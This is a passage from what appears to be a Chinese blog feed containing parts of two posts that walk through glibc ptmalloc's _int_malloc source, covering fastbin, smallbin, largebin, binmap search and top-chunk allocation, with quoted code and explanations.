<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">| fwd（头指针） | fwd-&gt;fd | ... | bck | victim（插入到末尾） |</div><div class="line">fwd-&gt;fd-&gt;bk_nextsize = victim</div><div class="line">victim-&gt;bk_nextsize-&gt;fd_nextsize = victim</div><div class="line">victim-&gt;fd_nextsize = fwd-&gt;fd</div><div class="line">victim-&gt;bk_nextsize = fwd-&gt;fd-&gt;bk_nextsize</div></pre></td></tr></table></figure>
<p>如果要插入的<code>victim</code>的<code>size</code>不是最小的，就要通过一个while循环遍历找到合适的位置，这里是从双向链表头<code>bck-&gt;fd</code>开始遍历，利用<code>fd_nextsize</code>加快遍历的速度，找到第一个<code>size&gt;=fwd-&gt;size</code>的chunk。如果<code>size=fwd-&gt;size</code>，就只是改变<code>victim</code>以及前后相应chunk的<code>bk</code>、<code>fd</code>指针就行。这里要特别注意，先做一个假设，假设chunk双向链表中A、B、C是三个不同大小的chunk集合，A集合有A0=A1=…，B集合有B0=B1=…，C集合有C0=C1=…，然后构造chunk链表，<br>| A0 | A1 | A2 | B0 | B1 | B2 | C0 | C1 | C2 |<br>特别注意，在ptmalloc中，只有A0、B0、C0可以配置<code>fd_nextsize</code>和<code>bk_nextsize</code>指针，其他位置是不用配置这两个指针的。因此相同大小的chunk只有最低地址的chunk会设置<code>fd_nextsize</code>和<code>bk_nextsize</code>指针。根据这个假设，很容易知道当两个size相等时，为什么要执行<code>fwd = fwd-&gt;fd</code>，因为要保证插入victim的位置是相同大小的chunk的右边，即高地址的地方。插入后的链表如下，</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">...| bck | victim | fwd |...</div></pre></td></tr></table></figure>
<p>链表中所有chunk的<code>fd_nextsize</code> 和<code>bk_nextsize</code>指针不变。<br>再往下，如果<code>size</code>不相等，则直接插入在<code>fwd</code>的左边，这样也能保证所有的<code>fd_nextsize</code>和<code>bk_nextsize</code>指针设置在相同chunk大小的最地地址处（最左边）。插入后的链表如下，</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">...| bck | victim | fwd |...</div><div class="line">victim-&gt;fd_nextsize = fwd</div><div class="line">victim-&gt;bk_nextsize = fwd-&gt;bk_nextsize;</div><div class="line">fwd-&gt;bk_nextsize = victim</div><div class="line">fwd-&gt;bk_nextsize-&gt;fd_nextsize = victim</div></pre></td></tr></table></figure>
<p>再往下，<code>mark_bin</code>用来标识<code>malloc_state</code>中的<code>binmap</code>，标识相应位置的chunk空闲。然后就更改<code>fd</code>、<code>bk</code>指针，插入到双向链表中，这个插入操作同时适用于smallbin和largebin，因此放在这里。最后如果在unsortedbin中处理了超过10000个chunk，就直接退出循环，这里保证不会因为unsortedbin中chunk太多，处理的时间太长了。<br>在这部分代码中，有个<code>size |= PREV_INUSE</code>是暂时让我比较费解的地方，经过分析后，暂时认为<code>size |= PREV_INUSE</code>是没必要的，虽然不会产生错误，也不会影响largebin中的排序，并且注释说这行代码能加速排序，但没看出能加速的地方，经过分析这里反而会多出一个无效的指针赋值，希望往后看代码时能解决这里的问题，或者希望有人能解答这行代码的具体作用。</p>
<p>回到<code>_int_malloc</code>函数中，继续往下看，为了使整个代码结构清晰，这里继续保留了外层的for循环。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div></pre></td><td class="code"><pre><div class="line">static void * _int_malloc(mstate av, size_t bytes) &#123;</div><div class="line"></div><div class="line">    ...</div><div class="line"></div><div class="line">    for (;;) &#123;</div><div class="line"></div><div class="line">        ...</div><div class="line"></div><div class="line">        if (!in_smallbin_range(nb)) &#123;</div><div class="line">            bin = bin_at (av, idx);</div><div class="line"></div><div class="line">            if ((victim = first(bin)) != bin</div><div class="line">                    &amp;&amp; (unsigned long) (victim-&gt;size) &gt;= (unsigned long) (nb)) &#123;</div><div class="line">                victim = victim-&gt;bk_nextsize;</div><div class="line">                while (((unsigned long) (size = chunksize(victim))</div><div class="line">                        &lt; (unsigned long) (nb)))</div><div class="line">                    victim = victim-&gt;bk_nextsize;</div><div class="line"></div><div class="line">                if (victim != last(bin) &amp;&amp; victim-&gt;size == victim-&gt;fd-&gt;size)</div><div class="line">                    victim = victim-&gt;fd;</div><div class="line"></div><div class="line">                remainder_size = size - nb;</div><div class="line">                unlink(av, victim, bck, fwd);</div><div class="line"></div><div class="line">                if (remainder_size &lt; MINSIZE) &#123;</div><div class="line">                    set_inuse_bit_at_offset(victim, size);</div><div class="line">                    if (av != &amp;main_arena)</div><div class="line">                        victim-&gt;size |= NON_MAIN_ARENA;</div><div class="line">                &#125;</div><div class="line">                else &#123;</div><div class="line">                    remainder = chunk_at_offset(victim, nb);</div><div class="line">                    bck = unsorted_chunks (av);</div><div class="line">                    fwd = bck-&gt;fd;</div><div class="line">                    if (__glibc_unlikely(fwd-&gt;bk != bck)) &#123;</div><div class="line">                        errstr = &quot;malloc(): corrupted unsorted chunks&quot;;</div><div class="line">                        goto errout;</div><div class="line">                    &#125;</div><div class="line">                    remainder-&gt;bk = bck;</div><div class="line">                    remainder-&gt;fd = fwd;</div><div class="line">                    bck-&gt;fd = remainder;</div><div class="line">                    fwd-&gt;bk = remainder;</div><div class="line">                    if (!in_smallbin_range(remainder_size)) &#123;</div><div class="line">                        remainder-&gt;fd_nextsize = NULL;</div><div class="line">                        remainder-&gt;bk_nextsize = NULL;</div><div class="line">                    &#125;</div><div class="line">                    set_head(victim,</div><div class="line">                            nb | PREV_INUSE | (av != &amp;main_arena ? NON_MAIN_ARENA : 0));</div><div class="line">                    set_head(remainder, remainder_size | PREV_INUSE);</div><div class="line">                    set_foot(remainder, remainder_size);</div><div class="line">                &#125;</div><div class="line">                check_malloced_chunk (av, victim, nb);</div><div class="line">                void *p = chunk2mem(victim);</div><div class="line">                alloc_perturb(p, bytes);</div><div class="line">                return p;</div><div class="line">            &#125;</div><div class="line">        &#125;</div><div class="line"></div><div class="line">        ...</div><div class="line"></div><div class="line">    &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>这部分代码的整体意思就是要尝试从largebin中取出对应的chunk了。<br>这里的<code>idx</code>是在前面（上一章分析的<code>_int_malloc</code>函数前面一部分中）根据宏<code>largebin_index</code>计算的。接下来就要根据<code>idx</code>获得largebin中的双向链表头指针<code>bin</code>，然后从<code>bin-&gt;bk</code>开始从尾到头（根据chunk大小从小到大）遍历整个双向链表，找到第一个大于用户需要分配的chunk大小<code>nb</code>的chunk指针<code>victim</code>。<br>找到<code>victim</code>后，需要将其拆开成两部分，第一部分是要返回给用户的chunk，第二部分分为两种情况，如果其大小小于<code>MINSIZE</code>，则不能构成一个最小chunk，这种情况下就将拆开前的整个<code>victim</code>返回给用户；如果大于<code>MINSIZE</code>，就将拆开后的第二部分<code>remainder</code>插入到unsortedbin中，然后把第一部分<code>victim</code>返回给用户。</p>
<p>继续往下看<code>_int_malloc</code>函数，</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div></pre></td><td class="code"><pre><div class="line">static void * _int_malloc(mstate av, size_t bytes) &#123;</div><div class="line"></div><div class="line">    ...</div><div class="line"></div><div class="line">    for (;;) &#123;</div><div class="line"></div><div class="line">        ...</div><div class="line"></div><div class="line">        ++idx;</div><div class="line">        bin = bin_at (av, idx);</div><div class="line">        block = idx2block(idx);</div><div class="line">        map = av-&gt;binmap[block];</div><div class="line">        bit = idx2bit(idx);</div><div class="line"></div><div class="line">        for (;;) &#123;</div><div class="line">            if (bit &gt; map || bit == 0) &#123;</div><div class="line">                do &#123;</div><div class="line">                    if (++block &gt;= BINMAPSIZE) /* out of bins */</div><div class="line">                        goto use_top;</div><div class="line">                &#125; while ((map = av-&gt;binmap[block]) == 0);</div><div class="line"></div><div class="line">                bin = bin_at (av, (block &lt;&lt; BINMAPSHIFT));</div><div class="line">                bit = 1;</div><div class="line">            &#125;</div><div class="line"></div><div class="line">            while ((bit &amp; map) == 0) &#123;</div><div class="line">                bin = next_bin(bin);</div><div class="line">                bit &lt;&lt;= 1;</div><div class="line">                assert(bit != 0);</div><div class="line">            &#125;</div><div class="line"></div><div class="line">            victim = last(bin);</div><div class="line">            if (victim == bin) &#123;</div><div class="line">                av-&gt;binmap[block] = map &amp;= ~bit;</div><div class="line">                bin = next_bin(bin);</div><div class="line">                bit &lt;&lt;= 1;</div><div class="line">            &#125;</div><div class="line"></div><div class="line">            else &#123;</div><div class="line">                size = chunksize(victim);</div><div class="line">                assert((unsigned long ) (size) &gt;= (unsigned long ) (nb));</div><div class="line">                remainder_size = size - nb;</div><div class="line">                unlink(av, victim, bck, fwd);</div><div class="line">                if (remainder_size &lt; MINSIZE) &#123;</div><div class="line">                    set_inuse_bit_at_offset(victim, size);</div><div class="line">                    if (av != &amp;main_arena)</div><div class="line">                        victim-&gt;size |= NON_MAIN_ARENA;</div><div class="line">                &#125;</div><div class="line">                else &#123;</div><div class="line">                    remainder = chunk_at_offset(victim, nb);</div><div class="line">                    bck = unsorted_chunks (av);</div><div class="line">                    fwd = bck-&gt;fd;</div><div class="line">                    if (__glibc_unlikely(fwd-&gt;bk != bck)) &#123;</div><div class="line">                        errstr = &quot;malloc(): corrupted unsorted chunks 2&quot;;</div><div class="line">                        goto errout;</div><div class="line">                    &#125;</div><div class="line">                    remainder-&gt;bk = bck;</div><div class="line">                    remainder-&gt;fd = fwd;</div><div class="line">                    bck-&gt;fd = remainder;</div><div class="line">                    fwd-&gt;bk = remainder;</div><div class="line"></div><div class="line">                    if (in_smallbin_range(nb))</div><div class="line">                        av-&gt;last_remainder = remainder;</div><div class="line">                    if (!in_smallbin_range(remainder_size)) &#123;</div><div class="line">                        remainder-&gt;fd_nextsize = NULL;</div><div class="line">                        remainder-&gt;bk_nextsize = NULL;</div><div class="line">                    &#125;</div><div class="line">                    set_head(victim,</div><div class="line">                            nb | PREV_INUSE | (av != &amp;main_arena ? NON_MAIN_ARENA : 0));</div><div class="line">                    set_head(remainder, remainder_size | PREV_INUSE);</div><div class="line">                    set_foot(remainder, remainder_size);</div><div class="line">                &#125;check_malloced_chunk (av, victim, nb);</div><div class="line">                void *p = chunk2mem(victim);</div><div class="line">                alloc_perturb(p, bytes);</div><div class="line">                return p;</div><div class="line">            &#125;</div><div class="line">        &#125;</div><div class="line"></div><div class="line">        ...</div><div class="line"></div><div class="line">    &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>这一部分的整体意思是，前面在largebin中寻找特定大小的空闲chunk，如果没找到，这里就要遍历largebin中的其他更大的chunk双向链表，继续寻找。<br>开头的<code>++idx</code>就表示，这里要从largebin中下一个更大的chunk双向链表开始遍历。ptmalloc中用一个bit表示<code>malloc_state</code>的<code>bins</code>数组中对应的位置上是否有空闲chunk，bit为1表示有，为0则没有。ptmalloc通过4个block（一个block 4字节）一共128个bit管理<code>bins</code>数组。因此，代码中计算的block表示对应的<code>idx</code>属于哪一个block，<code>map</code>就表是block对应的bit组成的二进制数字。<br>接下来进入for循环，如果<code>bit &gt; map</code>，表示该<code>map</code>对应的整个<code>block</code>里都没有大于<code>bit</code>位置的空闲的chunk，因此就要找下一个<code>block</code>。因为后面的<code>block</code>只要不等于0，就肯定有空闲chunk，并且其大小大于<code>bit</code>位置对应的chunk，下面就根据<code>block</code>，取出<code>block</code>对应的第一个双向链表的头指针。这里也可以看出，设置<code>map</code>和<code>block</code>也是为了加快查找的速度。如果遍历完所有<code>block</code>都没有空闲chunk，这时只能从top chunk里分配chunk了，因此跳转到<code>use_top</code>。<br>如果有空闲chunk，接下来就通过一个while循环依次比较找出到底在哪个双向链表里存在空闲chunk，最后获得空闲chunk所在的双向链表的头指针<code>bin</code>和位置<code>bit</code>。<br>接下来，如果找到的双向链表又为空，则继续前面的遍历，找到空闲chunk所在的双向链表的头指针<code>bin</code>和位置<code>bit</code>。如果找到的双向链表不为空，就和上面一部分再largebin中找到空闲chunk的操作一样了，这里就不继续分析了。</p>
<p>继续往下看<code>_int_malloc</code>，</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div></pre></td><td class="code"><pre><div class="line">static void * _int_malloc(mstate av, size_t bytes) &#123;</div><div class="line"></div><div class="line">    ...</div><div class="line"></div><div class="line">    for (;;) &#123;</div><div class="line"></div><div class="line">        ...</div><div class="line"></div><div class="line">        use_top:</div><div class="line"></div><div class="line">        victim = av-&gt;top;</div><div class="line">        size = chunksize(victim);</div><div class="line"></div><div class="line">        if ((unsigned long) (size) &gt;= (unsigned long) (nb + MINSIZE )) &#123;</div><div class="line">            remainder_size = size - nb;</div><div class="line">            remainder = chunk_at_offset(victim, nb);</div><div class="line">            av-&gt;top = remainder;</div><div class="line">            set_head(victim,</div><div class="line">                    nb | PREV_INUSE | (av != &amp;main_arena ? NON_MAIN_ARENA : 0));</div><div class="line">            set_head(remainder, remainder_size | PREV_INUSE);</div><div class="line"></div><div class="line">            check_malloced_chunk (av, victim, nb);</div><div class="line">            void *p = chunk2mem(victim);</div><div class="line">            alloc_perturb(p, bytes);</div><div class="line">            return p;</div><div class="line">        &#125;</div><div class="line">        else if (have_fastchunks(av)) &#123;</div><div class="line">            malloc_consolidate(av);</div><div class="line">            if (in_smallbin_range(nb))</div><div class="line">                idx = smallbin_index(nb);</div><div class="line">            else</div><div class="line">                idx = largebin_index(nb);</div><div class="line">        &#125;</div><div class="line">        else &#123;</div><div class="line">            void *p = sysmalloc(nb, av);</div><div class="line">            if (p != NULL)</div><div class="line">                alloc_perturb(p, bytes);</div><div class="line">            return p;</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>这里就是<code>_int_malloc</code>的最后一部分了，这部分代码的整体意思分为三部分，首先从top chunk中尝试分配内存；如果失败，就检查fastbin中是否有空闲内存了（其他线程此时可能将释放的chunk放入fastbin中了），如果不空闲，就合并fastbin中的空闲chunk并放入smallbin或者largebin中，然后会回到<code>_int_malloc</code>函数中最前面的for循环，重新开始查找空闲chunk；如果连fastbin中都没有空闲内存了，这时只能通过<code>sysmalloc</code>从系统分配内存了，该函数前面几章里已经分析过了一部分了，下一章会再次进入这个函数进行分析。这部分代码很简单，关键函数前面几章都碰到过了，这里就不详细分析了。</p>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>下面简单总结一遍<code>_int_malloc</code>函数的整体思路。<br>第一步：如果进程没有关联的分配区，就通过<code>sysmalloc</code>从操作系统分配内存。<br>第二步：从fastbin查找对应大小的chunk并返回，如果失败进入第三步。<br>第三步：从smallbin查找对应大小的chunk并返回，或者将fastbin中的空闲chunk合并放入unsortedbin中，如果失败进入第四步。<br>第四步：遍历unsortedbin，从unsortedbin中查找对应大小的chunk并返回，根据大小将unsortedbin中的空闲chunk插入smallbin或者largebin中。进入第五步。<br>第五步：从largebin指定位置查找对应大小的chunk并返回，如果失败进入第六步。<br>第六步：从largebin中大于指定位置的双向链表中查找对应大小的chunk并返回，如果失败进入第七步。<br>第七步：从topchunk中分配对应大小的chunk并返回，topchunk中没有足够的空间，就查找fastbin中是否有空闲chunk，如果有，就合并fastbin中的chunk并加入到unsortedbin中，然后跳回第四步。如果fastbin中没有空闲chunk，就通过<code>sysmalloc</code>从操作系统分配内存。</p>
]]></content>
      
        <categories>
            
            <category> pwn </category>
            
        </categories>
        
        
        <tags>
            
            <tag> heap </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[malloc源码分析——3]]></title>
      <url>/2018/05/21/malloc%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90%E2%80%94%E2%80%943/</url>
      <content type="html"><![CDATA[<h1 id="malloc源码分析—-int-malloc"><a href="#malloc源码分析—-int-malloc" class="headerlink" title="malloc源码分析—_int_malloc"></a>malloc源码分析—_int_malloc</h1><p>上一章分析了<code>_int_malloc</code>的前面一小部分，本章继续往下看，</p>
<h1 id="int-malloc-—-fastbin"><a href="#int-malloc-—-fastbin" class="headerlink" title="_int_malloc — fastbin"></a>_int_malloc — fastbin</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div></pre></td><td class="code"><pre><div class="line">static void * _int_malloc(mstate av, size_t bytes) &#123;</div><div class="line"></div><div class="line">    ...</div><div class="line"></div><div class="line">    if ((unsigned long) (nb) &lt;= (unsigned long) (get_max_fast ())) &#123;</div><div class="line">        idx = fastbin_index(nb);</div><div class="line">        mfastbinptr *fb = &amp;fastbin(av, idx);</div><div class="line">        mchunkptr pp = *fb;</div><div class="line">        do &#123;</div><div class="line">            victim = pp;</div><div class="line">            if (victim == NULL)</div><div class="line">                break;</div><div class="line">        &#125; while ((pp = catomic_compare_and_exchange_val_acq(fb, victim-&gt;fd, victim))</div><div class="line">                != victim);</div><div class="line">        if (victim != 0) &#123;</div><div class="line">            if (__builtin_expect(fastbin_index (chunksize (victim)) != idx, 0)) &#123;</div><div class="line">                errstr = &quot;malloc(): memory corruption (fast)&quot;;</div><div class="line">                errout: malloc_printerr(check_action, errstr, chunk2mem(victim),</div><div class="line">                        av);</div><div class="line">                return NULL;</div><div class="line">            &#125;check_remalloced_chunk (av, victim, nb);</div><div class="line">            void *p = chunk2mem(victim);</div><div class="line">            alloc_perturb(p, bytes);</div><div class="line">            return p;</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    ...</div><div class="line"></div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p><code>get_max_fast</code>返回fastbin可以存储内存的最大值，它在ptmalloc的初始化函数<code>malloc_init_state</code>中定义，后面会分析这个函数。<br>如果需要分配的内存大小nb落在fastbin的范围内，首先调用<code>fastbin_index</code>获得chunk大小<code>nb</code>对应的fastbin索引。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">#define fastbin_index(sz) \</div><div class="line">  ((((unsigned int) (sz)) &gt;&gt; (SIZE_SZ == 8 ? 4 : 3)) - 2)</div></pre></td></tr></table></figure>
<p>减2是根据fastbin存储的内存最小值计算的，本章假设<code>SIZE_SZ=4</code>，因此改写后<code>idx = nb/8-2</code>。<br>获得索引idx后，就通过fastbin取出空闲chunk链表指针，<code>mfastbinptr</code>其实就是<code>malloc_chunk</code>指针，</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">#define fastbin(ar_ptr, idx) ((ar_ptr)-&gt;fastbinsY[idx])</div></pre></td></tr></table></figure>
<p>下面的do、while循环又是一个CAS操作，其作用是从刚刚得到的空闲chunk链表指针中取出第一个空闲的chunk(victim)，并将链表头设置为该空闲chunk的下一个chunk(victim-&gt;fd)。这里注意，fastbin中使用的是单链表，而后面smallbin使用的是双链表。<br>获得空闲chunk后，需要转换为可以存储的内存指针，<code>chunk2mem</code>上一章分析过了，就是返回<code>malloc_chunk</code>结构中fd所在的位置，因为当一个chunk被使用时，<code>malloc_chunk</code>结构中<code>fd</code>、<code>bk</code>包括后面的变量都没有用了。最后调用<code>alloc_perturb</code>对用户使用的内存进行初始化，然后就返回该内存的指针了。<br>假设fastbin中没有找到空闲chunk，或者fastbin根本没有初始化，或者其他原因，就进入下一步，从smallbin中获取内存，因此继续往下看.</p>
<h1 id="int-malloc-—-smallbin-amp-largebin"><a href="#int-malloc-—-smallbin-amp-largebin" class="headerlink" title="_int_malloc — smallbin &amp; largebin"></a>_int_malloc — smallbin &amp; largebin</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div></pre></td><td class="code"><pre><div class="line">static void * _int_malloc(mstate av, size_t bytes) &#123;</div><div class="line"></div><div class="line">    ...</div><div class="line"></div><div class="line">    if (in_smallbin_range(nb)) &#123;</div><div class="line">        idx = smallbin_index(nb);</div><div class="line">        bin = bin_at (av, idx);</div><div class="line"></div><div class="line">        if ((victim = last(bin)) != bin) &#123;</div><div class="line">            if (victim == 0)</div><div class="line">                malloc_consolidate(av);</div><div class="line">            else &#123;</div><div class="line">                bck = victim-&gt;bk;</div><div class="line">                if (__glibc_unlikely(bck-&gt;fd != victim)) &#123;</div><div class="line">                    errstr = &quot;malloc(): smallbin double linked list corrupted&quot;;</div><div class="line">                    goto errout;</div><div class="line">                &#125;</div><div class="line">                set_inuse_bit_at_offset(victim, nb);</div><div class="line">                bin-&gt;bk = bck;</div><div class="line">                bck-&gt;fd = bin;</div><div class="line"></div><div class="line">                if (av != &amp;main_arena)</div><div class="line">                    victim-&gt;size |= NON_MAIN_ARENA;</div><div class="line">                check_malloced_chunk (av, victim, nb);</div><div class="line">                void *p = chunk2mem(victim);</div><div class="line">                alloc_perturb(p, bytes);</div><div class="line">                return p;</div><div class="line">            &#125;</div><div class="line">        &#125;</div><div class="line">    &#125;else &#123;</div><div class="line">        idx = largebin_index(nb);</div><div class="line">        if (have_fastchunks(av))</div><div class="line">            malloc_consolidate(av);</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    ...</div><div class="line"></div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>首先</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">#define in_smallbin_range(sz)  \</div><div class="line">  ((unsigned long) (sz) &lt; (unsigned long) MIN_LARGE_SIZE)</div></pre></td></tr></table></figure>
<p>基于本章假设，<code>MIN_LARGE_SIZE</code>经过换算后为512字节，因此低于512字节大小的内存块都归smallbin管理。<br>接下来通过<code>bin_at</code>获得smallbin空闲chunk链表指针，</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">#define bin_at(m, i) \</div><div class="line">  (mbinptr) (((char *) &amp;((m)-&gt;bins[((i) - 1) * 2]))               \</div><div class="line">             - offsetof (struct malloc_chunk, fd))</div></pre></td></tr></table></figure>
<p>这里乘2，并且减去fd相对于<code>malloc_chunk</code>中的位置是因为smallbin中存储的是fd和bk指针。<br><code>last</code>定义为</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">#define last(b)      ((b)-&gt;bk)</div></pre></td></tr></table></figure>
<p>该函数获得chunk的前一个chunk，由因为该chunk是smallbin的链表头，因此获得的是最后一个chunk，如果两者相等，表示对应的链表为空，什么都不做。<br>这里假设不相等，接下来有两种情况，第一种是<code>victim=0</code>，表示smallbin还没有初始化，这里需要特别说明一下这里。smallbin初始化为<code>malloc_chunk</code>指针数组，虽然定义为指针数组，但实际上存储的是fd和bk指针，如下所示<br>|fd|bk|fd|bk|…|fd|bk|<br>当smallbin还未初始化时，假设<code>idx=1</code>，根据<code>bin_at</code>取出的<code>bin</code>是一个虚拟的<code>malloc_chunk</code>指针，<code>bin-&gt;fd</code>，是第二个fd，因此<code>bin-&gt;bk</code>就是对应的bk，其值为0（bin-&gt;bk取出的不是地址，而是值）。因此当<code>victim</code>为0时，可以断定smallbin未初始化，此时调用<code>malloc_consolidate</code>进行初始化，</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line">static void malloc_consolidate(mstate av) &#123;</div><div class="line"></div><div class="line">    ...</div><div class="line"></div><div class="line">    if (get_max_fast () != 0) &#123;</div><div class="line"></div><div class="line">        ...</div><div class="line"></div><div class="line">    &#125; else &#123;</div><div class="line">        malloc_init_state(av);</div><div class="line">        check_malloc_state(av);</div><div class="line">    &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>省略代码的if语句里是将fastbin中的chunk进行合并，然后添加到bins中，这里不分析，因为还未初始化，因此<code>get_max_fast</code>返回0，后面的章节碰到了再分析。进入else部分，<code>check_malloc_state</code>为空函数，<code>malloc_init_state</code>就是主要的初始化函数，</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div></pre></td><td class="code"><pre><div class="line">static void malloc_init_state(mstate av) &#123;</div><div class="line">    int i;</div><div class="line">    mbinptr bin;</div><div class="line"></div><div class="line">    for (i = 1; i &lt; NBINS; ++i) &#123;</div><div class="line">        bin = bin_at (av, i);</div><div class="line">        bin-&gt;fd = bin-&gt;bk = bin;</div><div class="line">    &#125;</div><div class="line"></div><div class="line">#if MORECORE_CONTIGUOUS</div><div class="line">    if (av != &amp;main_arena)</div><div class="line">#endif</div><div class="line">        set_noncontiguous(av);</div><div class="line">    if (av == &amp;main_arena)</div><div class="line">        set_max_fast(DEFAULT_MXFAST);</div><div class="line">    av-&gt;flags |= 